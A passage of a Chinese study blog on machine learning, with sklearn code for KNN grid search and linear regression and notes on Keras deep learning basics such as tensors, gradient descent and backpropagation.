title="网格搜索"></a>网格搜索</h4><p>用于调参，也称为超参数搜索，有的时候一节参数需要手动设置，比如knn算法中的k值，这种参数称为<strong>超参数</strong>，手动过于复杂，对模型预设几组参数组合，每组参数采用<strong>交叉验证</strong>来进行评估，最后选出最优参数建立模型，假设有两个参数属于超参数，则设定两组参数组，使其进行排列组合后得到最优解。</p><p>使用api：sklearn.model_selection.GridSearchCV</p><p><img src="/images/image-20210315112719181.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">knn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    knn算法预测入驻位置    :return: None    """</span>    <span class="token comment">#读入数据</span>    <span class="token comment">#使用pandas读入csv文件</span>    data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./data/train.csv'</span><span class="token punctuation">)</span>    <span class="token comment">#进行测试，打印前10条</span>    <span class="token comment"># print(data.head(10))</span>    <span class="token comment">#处理数据</span>    <span class="token comment">#1.缩小数据量，使用pandas中的query</span>    data<span class="token operator">=</span>data<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">"x > 1.0 &amp; x &lt; 2.0 &amp; y > 1.0 &amp; y &lt; 2.0"</span><span class="token punctuation">)</span>    <span class="token comment">#2.对时间进行处理，使用pandas中的to_datetime实现,必须有返回值,返回时间格式的数据datetime</span>    time_value <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">)</span>    <span class="token comment"># print(time_value)</span>    <span class="token comment"># 通过对处理过的时间戳数据进行处理，提取出新的特征，构造出新的特征</span>    <span class="token comment">#使用datetimeindex进行处理，将时间格式的数据转化为字典格式,可以直接获取年月日等数据</span>    time_value <span class="token operator">=</span> pd<span class="token punctuation">.</span>DatetimeIndex<span class="token punctuation">(</span>time_value<span class="token punctuation">)</span>    <span class="token comment"># 加入特征</span>    data<span class="token punctuation">[</span><span class="token string">'day'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>day    <span class="token comment"># data['year']=time_value.year</span>    data<span class="token punctuation">[</span><span class="token string">'month'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>month    data<span class="token punctuation">[</span><span class="token string">'hour'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>hour    data<span class="token punctuation">[</span><span class="token string">'weekday'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>weekday    <span class="token comment">#删除时间戳特征，使用drop,删除time,axis=1代表以列删除</span>    data<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># print(data)</span>    <span class="token comment">#进行筛选，将入住人数少的place_id去掉</span>    <span class="token comment">#返回一个以place_id进行groupby后的数据流,输出的place_count后的剩余列会被count的数值所取代，完成了计数的目的</span>    <span class="token comment">#所以这里只用place_id和后面的数量进行筛选就好了</span>    place_count<span class="token operator">=</span>data<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'place_id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#将少于3人入住的样本去掉，并重设索引，place_count是以place_id为索引</span>    <span class="token comment">#tf以通过reset_index()让其以之前的模式以row_id0,1,2,3。。。为索引</span>    tf<span class="token operator">=</span>place_count<span class="token punctuation">[</span>place_count<span class="token punctuation">.</span>row_id<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 对data进行筛选，以place_id为条件</span>    <span class="token comment">#使用了DateFrame中布尔索引，可以用满足布尔条件的列值来过滤数据</span>    data<span class="token operator">=</span>data<span class="token punctuation">[</span>data<span class="token punctuation">[</span><span class="token string">'place_id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isin<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>place_id<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment">#取出数据当中的特征值和目标值</span>    <span class="token comment">#设定特征值和目标值</span>    <span class="token comment">#特征值x</span>    x<span class="token operator">=</span>data<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'place_id'</span><span class="token punctuation">,</span><span class="token string">'row_id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#目标值y</span>    y<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">'place_id'</span><span class="token punctuation">]</span>    <span class="token comment">#数据分割</span>    x_train<span class="token punctuation">,</span>x_test<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>y_test<span class="token operator">=</span>train_test_split<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>test_size<span class="token operator">=</span><span class="token number">0.25</span><span class="token punctuation">)</span>    <span class="token comment">#特征工程,对训练集和测试集的特征值都需要进行，因为</span>    std<span class="token operator">=</span>StandardScaler<span class="token punctuation">(</span><span class="token punctuation">)</span>    x_train<span class="token operator">=</span>std<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_train<span class="token punctuation">)</span>    <span class="token comment">#以已经进行特征预处理后的x_train格式来对x_test进行处理，这样二者格式才相同</span>    x_test<span class="token operator">=</span>std<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>    <span class="token comment">#利用算法进行训练</span>    <span class="token comment">#实例化，与k=5，当使用网格搜索时去掉这里的参数</span>    knn<span class="token operator">=</span> KNeighborsClassifier<span class="token punctuation">(</span><span class="token punctuation">)</span>    params_id<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"n_neighbors"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token comment">#多个n_neighbors进行验证</span>    msgv<span class="token operator">=</span>GridSearchCV<span class="token punctuation">(</span>knn<span class="token punctuation">,</span>params_id<span class="token punctuation">,</span>cv<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment">#传入三个参数，第一个是估计器，第二个是超参数，第三个是交叉验证划分的个数</span>    <span class="token comment">#传入数据</span>    msgv<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测的准确率："</span><span class="token punctuation">,</span>msgv<span class="token punctuation">.</span>score<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"交叉验证中最好的结果："</span><span class="token punctuation">,</span>msgv<span class="token punctuation">.</span>best_score_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"交叉验证中最好的模型："</span><span class="token punctuation">,</span>msgv<span class="token punctuation">.</span>best_estimator_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"每次交叉验证后的测试集准确率结果和训练集准确率结果"</span><span class="token punctuation">,</span>msgv<span class="token punctuation">.</span>cv_results_<span class="token punctuation">)</span>    <span class="token comment">#传入训练集特征值和目标值</span>    <span class="token comment"># knn.fit(x_train,y_train)</span>    <span class="token comment"># y_predict=knn.predict(x_test)</span>    <span class="token comment"># print("预测的位置",y_predict)</span>    <span class="token comment"># print("预测准确率",knn.score(x_test,y_test))</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210315161007011.png"></p><h3 id="常用回归算法"><a href="#常用回归算法" class="headerlink" title="常用回归算法"></a>常用回归算法</h3><p>回归：目标值是连续值，主要就是找到相关关系</p><h4 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h4><p>线性回归：寻找一种能预测的趋势<br>线性关系：二维：直线关系，三维：特征，目标值，平面当中</p><p>线性关系模型：<strong>一个通过属性的线性组合来进行预测的函数</strong></p><p>f(x)=w1x1+w2x2+….+wdxd+b</p><p>这里的x1，x2…是特征，w1,w2，w3等称为权重，b是偏置顶</p><p><strong>需要进行标准化处理，因为当一个特征的值太大时会对结果产生影响</strong></p><p>线性回归定义：定义：线性回归通过一个或者多个自变量（）与因变量之间进行建模的回归分析。其中可以为一个或多个自变量之间的的线性组合（线性回归的一种）</p><p>一元线性回归：涉及到的变量只有一个<br>多元线性回归：涉及到的变量两个或两个以上</p><p>将权重和特征转化为矩阵做矩阵相乘，</p><p><img src="/images/image-20210319114925336.png" alt="image-20210319114925336"></p><p>回归以及深度学习的模型算法都是<strong>迭代</strong>的算法，即一次次的优化更新，逐渐的接近目标值，减少误差</p><p><strong>损失函数</strong></p><p><img src="/images/image-20210319135114916.png"></p><p>最终目的：求解除让误差值最小的w</p><p>最小二乘法梯度下降：通过公式，沿着函数下降方向寻找，得到最适合的w值，更新w值（对 w值的循环迭代一般就是用最小二乘法，一般使用梯度下降使用正规方程的一般较少）</p><p><img src="/images/image-20210321214020541.png"></p><p>线性回归的整个核心思想可以理解为：</p><p><img src="/images/image-20210321214619745.png"></p><p>使用api：sklearn.linear_model.SGDRegressor </p><p><img src="/images/image-20210319144432628.png"></p><p><img src="/images/image-20210319150750378.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> load_boston    <span class="token comment">#导入数据集</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>linear_model <span class="token keyword">import</span> LinearRegression<span class="token punctuation">,</span>SGDRegressor  <span class="token comment">#线性回归api</span><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split<span class="token comment">#数据集分割</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>preprocessing <span class="token keyword">import</span> StandardScaler<span class="token comment">#标准化</span><span class="token keyword">def</span> <span class="token function">ln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    线性回归预测房价    :return: none    """</span>    data <span class="token operator">=</span>load_boston<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#分割数据</span>    x_train<span class="token punctuation">,</span>x_test<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>y_test<span class="token operator">=</span>train_test_split<span class="token punctuation">(</span>data<span class="token punctuation">.</span>data<span class="token punctuation">,</span>data<span class="token punctuation">.</span>target<span class="token punctuation">,</span>test_size<span class="token operator">=</span><span class="token number">0.25</span><span class="token punctuation">)</span>    <span class="token comment">#标准化</span>    std_x<span class="token operator">=</span>StandardScaler<span class="token punctuation">(</span><span class="token punctuation">)</span>    std_y<span class="token operator">=</span>StandardScaler<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#特征值</span>    x_train<span class="token operator">=</span>std_x<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_train<span class="token punctuation">)</span>    x_test<span class="token operator">=</span>std_x<span class="token punctuation">.</span>transform<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>    <span class="token comment"># print(x_test)</span>    <span class="token comment">#目标值</span>    <span class="token comment">#这里会出错，因为标准化api要求必须传入二维的参数，这里直接传入Y-train等会有错误，需要进行格式转化，使用reshape</span>    y_train<span class="token operator">=</span>std_y<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>y_train<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y_test<span class="token operator">=</span>std_y<span class="token punctuation">.</span>transform<span class="token punctuation">(</span>y_test<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(y_test)</span>    <span class="token comment">#进行预测</span>    lr <span class="token operator">=</span>LinearRegression<span class="token punctuation">(</span><span class="token punctuation">)</span>    lr<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>    y_preidict<span class="token operator">=</span>lr<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"回归系数w："</span><span class="token punctuation">,</span>lr<span class="token punctuation">.</span>coef_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测价格(没有标准化处理)"</span><span class="token punctuation">,</span>y_preidict<span class="token punctuation">)</span>    y_preidict<span class="token operator">=</span>std_y<span class="token punctuation">.</span>inverse_transform<span class="token punctuation">(</span>y_preidict<span class="token punctuation">)</span>  <span class="token comment">#将数据转换为原来的样式，这里会转换为房价</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测价格"</span><span class="token punctuation">,</span>y_preidict<span class="token punctuation">)</span>    <span class="token keyword">return</span>  <span class="token boolean">None</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    ln<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h1><p>基于Keras的深度学习，keras的便捷性让我们选择其作为入门深度学习的第一选择**<em>以《python深度学习》作为学习指导**</em></p><p>记录一定的 基础知识：</p><p><strong>“深度学习”中的“深度”指 的并不是利用这种方法所获取的更深层次的理解，而是指一系列连续的表示层。数据模型中 包含多少层，这被称为模型的深度，其他机器学习方法的重点往往是仅仅学习一两层的数据表示，因此有时也被称为浅层学习</strong></p><p>可以将深度网络看作多级信息蒸馏操作：信息穿过连续的过 滤器，其纯度越来越高（即对任务的帮助越来越大）</p><ul><li><p>权重：神经网络对每层所输入的数据所做的具体操作保存在该层的<strong>权重</strong>中，本质是一串数字，也被称为参数，学习的意思是为神经网络的所有层找到一组 权重值，使得该网络能够将每个示例输入与其目标正确地一一对应，</p></li><li><p>神经网络损失函数：损失函数的输入是网络预测值与真实目标值（即你希望网络输出的 结果），然后计算一个距离值，衡量该网络在这个示例上的效果好坏</p></li><li><p>优化器：利用损失值来对权重值进行一个调整，通过优化器实现了一个迭代的过程，<strong>最开始的权重是随机值，随着优化器的不断优化，让损失值不断降低</strong>，</p></li></ul><p>这可以看做是深度学习的简要流程</p><p><img src="/images/image-20210322193422882.png"></p><p>深度学习从数据中进行学习时有两个基本特征：</p><p>第一，通过渐进的、逐层的方式形成越来 越复杂的表示；</p><p>第二，对中间这些渐进的表示共同进行学习</p><p>数据存储在多维 Numpy 数组中，也叫张量（tensor）。一般来说，当前所 有机器学习系统都使用张量作为基本数据结构，张量的维度（dimension）通常叫作轴（axis）</p><h2 id="神经网络的数据表示与处理"><a href="#神经网络的数据表示与处理" class="headerlink" title="神经网络的数据表示与处理"></a>神经网络的数据表示与处理</h2><h3 id="数据表示"><a href="#数据表示" class="headerlink" title="数据表示"></a>数据表示</h3><ul><li>标量（0D 张量）：仅包含一个数字的张量叫作标量（scalar，也叫标量张量、零维张量、0D 张量）。在 Numpy 中，一个 float32 或 float64 的数字就是一个标量张量</li><li>向量（1D 张量）：数字组成的数组叫作向量（vector）或一维张量（1D 张量）。一维张量只有一个轴。</li><li>矩阵（2D 张量）：向量组成的数组叫作矩阵（matrix）或二维张量（2D 张量）。矩阵有 2 个轴（通常叫作行和 列）。</li><li>3D 张量与更高维张量将多个矩阵组合成一个新的数组，可以得到一个 3D 张量，你可以将其直观地理解为数字 组成的立方体。</li><li>关键属性<ul><li>轴的个数（阶）。例如，3D 张量有 3 个轴，矩阵有 2 个轴。这在 Numpy 等 Python 库中 也叫张量的 ndim<strong>可以通过ndim参数查看器轴的个数，也即其维数</strong></li><li>形状。这是一个整数元组，表示张量沿每个轴的维度大小（元素个数）。例如，矩阵示例的形状为 (3, 5)，3D 张量示例的形状为 (3, 3, 5)。向量的形状只包含一个 元素，比如 (5,)，而标量的形状为空，即 ()。</li><li>数据类型，在 Python 库中通常叫作 dtype，这是张量中所包含数据的类型，例如，张 量的类型可以是 float32、uint8、float64 等。在极少数情况下，你可能会遇到字符 （char）张量。注意，Numpy（以及</li></ul></li></ul><p><img src="/images/image-20210323103819995.png"></p><p>除了对这一个张量进行选取，也可以对任意的张量进行选取，比如可以选择后两个张量进行索引截取，</p><p><code>my_slice = train_images[:, 14:, 14:]</code>,这表示选取所有样本，取出其右下角14像素x14像素的区域</p><p>也可以使用负数索引。与 Python 列表中的负数索引类似，它表示与当前轴终点的相对位置。 你可以在图像中心裁剪出 14 像素×14 像素的区域：<code>my_slice = train_images[:, 7:-7, 7:-7]</code></p><ul><li><p>数据批量：深度学习中所有数据张量的第一个轴（0 轴，因为索引从 0 开始）都是样本轴，深度学习模型不会同时处理整个数据集，而是将数据拆分成小批量，对于这种批量张量，第一个轴（0 轴）叫作批量轴（batch axis）或批量维度</p></li><li><p><strong>将会用到的张量维度：</strong></p><ul><li>2D：向量数据，形状为 (samples, features)<ul><li>这是最常见的数据。对于这种数据集，每个数据点都被编码为一个向量，因此一个数据批 量就被编码为 2D 张量（即向量组成的数组），其中第一个轴是样本轴，第二个轴是特征轴，</li><li>例子：人口统计数据集，其中包括每个人的年龄、邮编和收入。每个人可以表示为包含 3 个值 的向量，而整个数据集包含 100 000 个人，因此可以存储在形状为 (100000, 3) 的 2D 张量中。</li></ul></li><li>3D：时间序列数据或序列数据，形状为 (samples, timesteps, features)<ul><li>当时间（或序列顺序）对于数据很重要时，应该将数据存储在带有时间轴的 3D 张量中。 每个样本可以被编码为一个向量序列（即 2D 张量），因此一个数据批量就被编码为一个 3D 张 量，根据惯例，时间轴始终是第 2 个轴（索引为 1 的轴）</li><li>例子： 股票价格数据集。每一分钟，我们将股票的当前价格、前一分钟的最高价格和前一分钟 的最低价格保存下来。因此每分钟被编码为一个 3D 向量，整个交易日被编码为一个形 状为 (390, 3) 的 2D 张量（一个交易日有 390 分钟），而 250 天的数据则可以保存在一 个形状为 (250, 390, 3) 的 3D 张量中。这里每个样本是一天的股票数据</li></ul></li><li>4D：图像，形状为 (samples, height, width, channels) 或 (samples, channels,  height, width)<ul><li>图像通常具有三个维度：高度、宽度和颜色深度(一个像素中，每个颜色分量（Red、Green、Blue、Alpha通道）的比特数)，图像张量始终都是 3D 张量，灰 度图像的彩色通道只有一维。因此，如果图像大小为 256×256，那么 128 张灰度图像组成的批 量可以保存在一个形状为 (128, 256, 256, 1) 的张量中，而 128 张彩色图像组成的批量则可以保存在一个形状为 (128, 256, 256, 3) 的张量中</li></ul></li><li>5D：视频，形状为 (samples, frames, height, width, channels) 或 (samples,  frames, channels, height, width)<ul><li>视频数据是现实生活中需要用到 5D 张量的少数数据类型之一。视频可以看作一系列帧， 每一帧都是一张彩色图像。由于每一帧都可以保存在一个形状为 (height, width, color_ depth) 的 3D 张量中，，因此一系列帧可以保存在一个形状为 (frames, height, width,  color_depth) 的 4D 张量中，而不同视频组成的批量则可以保存在一个 5D 张量中，其形状为 (samples, frames, height, width, color_depth)</li><li>一个以每秒 4 帧采样的 60 秒 YouTube 视频片段，视频尺寸为 144×256，这个 视频共有 240 帧。4 个这样的视频片段组成的批量将保存在形状为 (4, 240, 144, 256, 3) 的张量中。</li></ul></li></ul></li><li><p>大多数其他库）中不存在字符串张量</p></li></ul><h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><p>深度神经网络学到的所有变换也都可以简化为数值数据张量上的一些张量运算，例如relu(x) 是 max(x, 0)</p><ul><li><p>逐元素运算：relu 运算和加法都是逐元素（element-wise）的运算，即该运算独立地应用于张量中的每 个元素，通过numpy可以高效的实现一些逐元素运算，，例如：<img src="/images/image-20210323185643911.png"></p></li><li><p>广播：上述例子中逐元素运算中值适合于两个形状相同的张量相加，如果将两个形状不同的张量相加，如果没有歧义的话，较小的张量会被<strong>广播</strong>，以匹配较大张量的形状，广播包含以下两步：</p><ul><li>向较小的张量添加轴（叫作广播轴），使其 ndim 与较大的张量相同</li><li>将较小的张量沿着新轴重复，使其形状与较大的张量相同</li><li>一个具体的例子。假设 X 的形状是 (32, 10)，y 的形状是 (10,)。首先，我们给 y 添加空的第一个轴，这样 y 的形状变为 (1, 10)。然后，我们将 y 沿着新轴重复 32 次，这样 得到的张量 Y 的形状为 (32, 10)，并且 Y[i, :] == y for i in range(0, 32)。现在， 我们可以将 X 和 Y 相加，因为它们的形状相同。</li><li>下面这个例子利用广播将逐元素的 maximum 运算应用于两个形状不同的张量，这样就可以完成2D张量y的广播</li></ul><p><img src="/images/image-20210323191340629.png"></p></li><li><p>张量点积：点积运算，也叫张量积，不是逐元素的相乘，是最常见也最有用的 张量运算。与逐元素的运算不同，它将输入张量的元素合并在一起</p><ul><li>在 Numpy、Keras、Theano 和 TensorFlow 中，都是用 * 实现逐元素乘积。TensorFlow 中的 点积使用了不同的语法，但在 Numpy 和 Keras 中，都是用标准的 dot 运算符来实现点积,</li></ul><p><img src="/images/image-20210323191617170.png"></p><ul><li>点积运算做了以下工作：注意，两个向量之间的点积是一个标量，而且只有元素个数相同的向量之间才能做点积。</li></ul><p><img src="/images/image-20210323192100254.png"></p><ul><li>你还可以对一个矩阵 x 和一个向量 y 做点积，返回值是一个向量，其中每个元素是 y 和 x 的每一行之间的点积。其实现过程如下。</li></ul><p><img src="/images/image-20210323192154380.png"></p><ul><li>注意，如果两个张量中有一个的 ndim 大于 1，那么 dot 运算就不再是对称的，也就是说， dot(x, y) 不等于 dot(y, x)</li><li>当然，点积可以推广到具有任意个轴的张量。最常见的应用可能就是两个矩阵之间的点积。 对于两个矩阵 x 和 y，当且仅当 x.shape[1] == y.shape[0] 时，你才可以对它们做点积 （dot(x, y)）。得到的结果是一个形状为 (x.shape[0], y.shape[1]) 的矩阵，其元素为 x 的行与 y 的列之间的点积。<strong>如果对于2D张量其实就是矩阵相乘。。。</strong></li></ul></li><li><p>张量变形：张量变形是指改变张量的行和列，以得到想要的形状。变形后的张量的元素总个数与初始 张量相同。</p><p><img src="/images/image-20210323193838150.png"></p><ul><li>经常遇到的一种特殊的张量变形是转置（transposition）。对矩阵做转置是指将行和列互换， 使 x[i, :] 变为 x[:, i]。</li></ul></li></ul><h3 id="神经网络的梯度优化："><a href="#神经网络的梯度优化：" class="headerlink" title="神经网络的梯度优化："></a>神经网络的梯度优化：</h3><p>神经网络都是依靠<strong>梯度</strong>进行优化的，对于一个例子：<code>output = relu(dot(W, input) + b)</code>:</p><p>在这个表达式中，W 和 b 都是张量，均为该层的属性。它们被称为该层的<strong>权重</strong>或<strong>可训练参数</strong>，这些权重包含网络从观察 训练数据中学到的信息，一开始，这些权重矩阵取较小的随机值，这一步叫作随机初始化，W 和 b 都是随机的，relu(dot(W, input) + b) 肯定不会得到任何有用的表示。虽然 得到的表示是没有意义的，但这是一个起点。下一步则是根据反馈信号逐渐调节这些权重。这 个逐渐调节的过程叫作<strong>训练</strong>，也就是机器学习中的学习</p><p>上述过程发生在一个训练循环（training loop）内，其具体过程如下。必要时一直重复这些 步骤。</p><ol><li>抽取训练样本 x 和对应目标 y 组成的数据批量</li><li>在 x 上运行网络［这一步叫作前向传播（forward pass）］，得到预测值 y_pred。</li><li>计算网络在这批数据上的损失，用于衡量 y_pred 和 y 之间的距离。</li><li>更新网络的所有权重，使网络在这批数据上的损失略微下降。</li></ol><p>最终得到的网络在训练数据上的损失非常小，即预测值 y_pred 和预期目标 y 之间的距离 非常小。网络“学会”将输入映射到正确的目标。</p><p>难点在于：<strong>更新网 络的权重。考虑网络中某个权重系数，你怎么知道这个系数应该增大还是减小，以及变化多少</strong></p><p>现在普遍使用的方法就是：<strong>计算损失相对于网络系数的梯度（gradient），然后向梯度 的反方向改变系数，从而使损失降低</strong></p><p>这里对梯度做一个回顾，是微积分中的内容：<strong>梯度的本意是一个向量（矢量），表示某一函数在该点处的方向导数沿着该方向取得最大值，即函数在该点处沿着该方向（此梯度的方向）变化最快，变化率最大（为该梯度的模）。</strong></p><p><img src="/images/image-20210323200609485.png"></p><p>简单来说，通过梯度，可以找到函数最快的下降方向，这样对于权重的更新是高效的方法，当然，这里以二元函数为例，但在深度学习中的权重会很多，函数的维度会很高，但原理是相同的。</p><p>具体步骤如下：</p><ol><li>抽取训练样本 x 和对应目标 y 组成的数据批量</li><li>在 x 上运行网络，得到预测值 y_pred。</li><li>计算网络在这批数据上的损失，用于衡量 y_pred 和 y 之间的距离。</li><li>计算损失相对于网络参数的梯度［一次反向传播（backward pass）］。</li><li> 将参数沿着梯度的反方向移动一点，比如 W -= step * gradient，从而使这批数据 上的损失减小一点。</li></ol><p>上述方法叫做<strong>小批量随机梯度下降（SGD）</strong>，注意，小批量 SGD 算法的一个变体是每次迭代时只抽取一个样本和目标，而不是抽取一批 数据。还有另一种极端，每一次迭代都在所有数据上 运行，这样做的话，每次更新都更加准确，但计算代价也高得多。这两个极 端之间的有效折中则是选择合理的批量大小。</p><p>此外，SGD 还有多种变体，其区别在于计算下一次权重更新时还要考虑上一次权重更新， 而不是仅仅考虑当前梯度值，比如带动量的 SGD、Adagrad、RMSProp 等变体。这些变体被称 为优化方法（optimization method）或优化器（optimizer）。因为SGD会有缺陷，比如：</p><p><img src="/images/image-20210323201258406.png"></p><p>在某个参数值附近，有一个局部极小点，在这个点附近，向 左移动和向右移动都会导致损失值增大。如果使用小学习率的 SGD 进行优化，那么优化过程可 能会陷入局部极小点，导致无法找到全局最小点。所以<strong>动量</strong>的概念尤其值得关注，它在 许多变体中都有应用。动量解决了 SGD 的两个问题：收敛速度和局部极小点。这在实践中的是指， 更新参数 w 不仅要考虑当前的梯度值，还要考虑上一次的参数更新，具体示例如下：</p><p><img src="/images/image-20210323201807621.png"></p><p><strong>链式求导：反向传播算法</strong></p><p>在前面的算法中，我们假设函数是可微的，因此可以明确计算其导数。在实践中，神经网 络函数包含许多连接在一起的张量运算，每个运算都有简单的、已知的导数。例如，下面这个 网络 f 包含 3 个张量运算 a、b 和 c，还有 3 个权重矩阵 W1、W2 和 W3。 f(W1, W2, W3) = a(W1, b(W2, c(W3)))</p><p>根据微积分的知识，这种函数链可以利用下面这个恒等式进行求导，它称为链式法则（chain  rule）：(f(g(x)))’ = f’(g(x)) * g’(x)。将链式法则应用于神经网络梯度值的计算，得 到的算法叫作反向传播（backpropagation，有时也叫反式微分，</p><p>回顾本章的第一个例子，已经可以简要明白整个神经网络的训练过程：</p><p><img src="/images/image-20210323203447282.png"></p><p><img src="/images/image-20210323203506669.png"></p><p>到这里前置知识就算是结束了，自己感觉对于神经网络最精简的理解还是这个图，上述的所有内容都可以归入这个图里，也算是对专业术语的一个了解了，~~~终于可以开始了写代码了，淦~~~：</p><p><img src="/images/image-20210323203731861.png"></p><h2 id="神经网络入门"><a href="#神经网络入门" class="headerlink" title="神经网络入门"></a>神经网络入门</h2><p>针对上图，将要对<strong>层，输入数据，损失函数，优化器</strong>进行理解记录，这样就能简要完整实现一个神经网络模型</p><h3 id="神经网络结构："><a href="#神经网络结构：" class="headerlink" title="神经网络结构："></a>神经网络结构：</h3><h4 id="层"><a href="#层" class="headerlink" title="层"></a>层</h4><p>层，是神经网络的基本数据结构。层是一个数据处理模块，将一个 或多个输入张量转换为一个或多个输出张量。有些层是无状态的，但大多数的层是有状态的， 即层的权重。权重是利用随机梯度下降学到的一个或多个张量，其中包含网络的知识</p><ul><li><p>对于2D模型：形状为 (samples, features)，通常用密集连接层，也 叫全连接层或密集层，对应于 <strong>Keras 的 Dense</strong> 类，来进行处理</p></li><li><p>对于3D模型：形状为 (samples, timesteps, features)，通常用循环 层（recurrent layer，比如 Keras 的 LSTM 层）来进行处理</p></li><li><p>对于4D模型：通常用二维 卷积层（Keras 的 Conv2D）来处理</p></li></ul><p>在 